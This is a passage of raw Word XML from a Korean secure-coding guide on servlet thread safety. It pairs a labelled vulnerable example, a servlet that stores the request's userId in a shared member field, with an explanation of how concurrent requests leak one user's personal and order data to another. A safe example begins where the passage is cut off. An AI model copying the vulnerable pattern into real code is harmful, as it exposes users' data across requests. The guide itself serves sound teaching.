            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>싱글톤</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(Servlet) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>객체의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멤버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필드에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요청별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데이터를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저장하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청별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데이터는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반드시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지역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변수에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저장한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] Servlet </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>멤버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변수에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공유됨</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>public class UserServlet extends HttpServlet {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    private String currentUserId;  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>요청이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공유하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>멤버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>!</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    protected void doGet(HttpServletRequest req, ...) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        currentUserId = req.getParameter("userId");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>요청에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>노출</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">Servlet </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>멤버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변수는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공유합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> A </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동시에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>들어오면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> currentUserId</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>덮어씌워져</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개인정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주문내역을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>혼선이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>지역</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
